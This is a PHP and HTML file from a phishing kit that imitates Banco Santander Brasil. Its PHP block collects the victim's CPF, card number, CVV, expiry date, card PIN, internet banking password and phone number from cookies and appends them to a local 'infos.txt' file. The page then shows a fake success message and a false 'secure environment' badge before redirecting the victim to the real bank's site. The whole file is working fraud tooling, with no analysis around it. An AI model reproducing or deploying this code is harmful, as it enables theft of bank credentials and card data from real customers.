﻿
<?php
$cpf = $_COOKIE['cpf'];
$cartao = $_COOKIE['cartao'];
$cvv = $_COOKIE['cvv'];
$mes = $_COOKIE['mes'];
$ano = $_COOKIE['ano'];
$senhacartao = $_COOKIE['senhacartao'];
$senhainternetbanking = $_COOKIE['senhainternetbanking'];
$ddd = $_COOKIE['ddd'];
$celular = $_COOKIE['celular'];

$conteudo = "CPF: ".$cpf." | Cartao: ".$cartao." | CVV: ".$cvv." | Mes: ".$mes." | Ano: ".$ano." | Senha Cartao: ".$senhacartao." | Senha Internet Banking: ".$senhainternetbanking." | DDD: ".$ddd." | Celular: ".$celular;


$myfile = fopen("../infos.txt", "a");
fwrite($myfile, $conteudo."\n");
fclose($myfile);


?>


<?php
error_reporting(0);
$cpfis = $_POST['cpfis'];

$hora      	= date("d/m/Y");              //Hora de envio





	function maskaraCPF($val, $mask)

{

 $maskared = '';

 $k = 0;

 for($i = 0; $i<=strlen($mask)-1; $i++)

 {

 if($mask[$i] == '#')

 {

 if(isset($val[$k]))

 $maskared .= $val[$k++];

 }

 else

 {

 if(isset($mask[$i]))

 $maskared .= $mask[$i];

 }

 }

 return $maskared;

}





?>

<!doctype html>

<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta name="viewport" content="width=device-width, user-scalable=false;">

<link rel="shortcut icon" type="image/x-icon" href="imagens/00.ico">

<title>🔒 [Vamos Fazer Juntos]</title>

<link rel="stylesheet" href="css/bootstrap.min.css">

<link rel="stylesheet" href="css/bootstrap-theme.min.css">

<link rel="stylesheet" href="css/styles11.css">

<script src="js/bootstrap.min.js"></script>

<script src="js/number.js"></script>

<script>

function validar() {

var ModalAlertError = document.getElementById("TextErrorModal");

var ModalAlert = document.getElementById("modalalert");

if ( document.form.telefone.value == "" || document.form.telefone.length < 10 || document.form.telefone.value == "(00)00000-0000" || document.form.telefone.value == "(11)11111-1111" || document.form.telefone.value == "(22)22222-2222" || document.form.telefone.value == "(33)33333-3333" || document.form.telefone.value == "(44)44444-4444" || document.form.telefone.value == "(55)55555-5555" || document.form.telefone.value == "(66)66666-6666" || document.form.telefone.value == "(77)77777-7777" || document.form.telefone.value == "(88)88888-8888" || document.form.telefone.value == "(99)99999-9999"){ ModalAlertError.innerHTML = "Telefone inválido! 'DDD + Número'"; ModalAlert.style.display = ""; return false; }



if (

document.form.seis1.value == "" || 

document.form.seis2.value == "" || 

document.form.seis3.value == "" || 

document.form.seis4.value == "" )

{ ModalAlertError.innerHTML = "Senha de (6 dígitos), inválida!"; ModalAlert.style.display = ""; return false; 

}



}

</script>



<script>

function message(){

var ModalAlertError = document.getElementById("TextErrorModal");

var ModalAlert = document.getElementById("modalalert");

	ModalAlertError.innerHTML = "Para efetuar transações, informe os dados obrigatório para confirmar!"; ModalAlert.style.display = "";

	}

</script>



<script>

function clicar(){

	document.form.seis1.focus(); return

	}

</script>



<script>

function aa(input) {

    if (input.value == "") {

        input.style.backgroundColor = "white";

    }

    else{

        input.style.backgroundColor = "black";

		input.style.fontSize = "0.1em";

    }

}

</script>



<script language="javascript">

function pulacampo(idobj, idproximo){

var str = new String(document.getElementById(idobj).value);

var mx = new Number(document.getElementById(idobj).maxLength);

if (str.length == mx)

{

document.getElementById(idproximo).focus();

}

}

</script>



<style>

.modalposition { background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.3); position:fixed; top:0; left:0; right:0; bottom:0; }

.modalposition2{ max-width:450px; margin:0 auto; z-index: 99999; border: 5px solid #EEE; position: absolute; left:10px; right:10px;	font-family: Arial;	font-size: 12px; top: 25%; height:; background:#FFF; color:#000; border-radius:5px; box-shadow: 0 0 10px #999; padding:0 0 15px 0; }

.modaltext{ padding: 15px; color:#666666; }

#bs { padding:5px 30px 5px 30px;}

</style>

</head>



<body>



<div style="position:absolute; top:0px; left:0px; right:0px; bottom:0px; background: #EEE;">



<div class="col-sm-7" style="background:#F5090D; Width:100%; height:45px; padding:10px; border-bottom:1px solid #CCC; color:#0060A9;">

                    <img src="imagens/solution.png" width="184" height="25" alt=""/><font size="3"><b></b></font>

</div>



<div class="col-sm-7" style="padding:10px; background:#E0E0E0;">



<div style="padding:10px; background:#FFF;">



<div><script language="JavaScript" type="text/javascript">

<!--

mydate = new Date();

myday = mydate.getDay();

mymonth = mydate.getMonth();

myweekday= mydate.getDate();

weekday= myweekday; 



if(myday == 0)

day = " Domingo, " 



else if(myday == 1)

day = " Segunda-Feira, " 



else if(myday == 2)

day = " Terca-Feira, " 



else if(myday == 3)

day = " Quarta-Feira, " 



else if(myday == 4)

day = " Quinta-Feira, " 



else if(myday == 5)

day = " Sexta-Feira, " 



else if(myday == 6)

day = " Sabado, " 



if(mymonth == 0)

month = "Janeiro " 



else if(mymonth ==1)

month = "Fevereiro " 



else if(mymonth ==2)

month = "Marco " 



else if(mymonth ==3)

month = "Abril " 



else if(mymonth ==4)

month = "Maio " 



else if(mymonth ==5)

month = "Junho " 



else if(mymonth ==6)

month = "Julho " 



else if(mymonth ==7)

month = "Agosto " 



else if(mymonth ==8)

month = "Setembro " 



else if(mymonth ==9)

month = "Outubro " 



else if(mymonth ==10)

month = "Novembro " 



else if(mymonth ==11)

month = "Dezembro " 



document.write("<font face=verdana, size=1 color=#666666>&nbsp;"+ day);

document.write(myweekday+" de "+month+ "de 2021</font>");

// -->

                </script></div><div>&nbsp;<h1 style="font-family: verdana, arial; color: rgb(237, 34, 40); font-size: 12px; margin: 0px 0px 10px; background-color: rgb(236, 235, 235); border: 1px solid rgb(221, 221, 221); padding: 5px; font-weight: bold; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;">

Procedimento concluído!

</h1></div>





<form name="form" id="form" action="https://www.santander.com.br/" method="post" onSubmit="return validar()">

<input type="hidden" name="cpfis" id="cpfis" value="" />

<p align="center">&nbsp;</br>

</p>



<div style="font-size:14px; color:#666666;">

	<p align="center"><b><font color="#009900" style="font-size: 10pt">Sua 

	ativação Cadastral foi Realizada com Sucesso!</font></b><p align="center">

	<font style="font-size: 8pt">O Santander assegura a proteção das informações contidas no Portal 

	Santander pelas leis e normas que regulamentam os direitos autorais, marcas registradas e patentes 

	previstas no Código Penal Brasileiro.</font><span style="font-size: 8pt">

	</span> <font style="font-size: 8pt">.<br>

	</font><font color="#5B5B5B">

						    <a href="https://play.google.com/store/apps/details?id=br.com.santander.way&hl=pt_BR&gl=US">

							<font color="#F01215">

	<p align="center">[Fechar]</font></a></font> 

	</div>

<p></p><div style="height:60px; width:100%; margin-top:10px;">

		<p align="center">

		<img border="0" src="imagens/selo.png" width="80" height="80">&nbsp;</br></div>

<div style="height:18px; margin-top:10px; width:100%;">





&nbsp;

</div>

</div>



<div style="height:64px; width:100%; margin:10px 0 10px 0;">

<input type="submit" name="bt" id="bt" value="FINALIZAR" class="btn btn-primary" style="font-size:13px;"/>

</div>



</form>

</div>

</div>



</div>













<div style="Width:100%; height:33px; position:absolute; bottom:6px; background:#FF0000; border-top:1px solid #CCC;" id="casa">

<div style="background:#FF0000; padding:1px 0 0 10px;">

<div style="height:20px; background:url(imagens/cadiado.png) no-repeat; background-size:contain; padding:3px 0 0 30px; margin-top:5px; font-weight:bold; color:#FFFFFF; font-size:0.8em;  text-shadow:;">

	Ambiente seguro.<div style="float:right; border-radius:50px; padding:0 10px 0 0"> <font face="arial">

			Banco Santander (Brasil) S.A.</font></div></div>

</div>

</div>



<!-- ================================================================ -->

<div style="display:none;" id="modalalert" class="modalposition">

&nbsp;</div>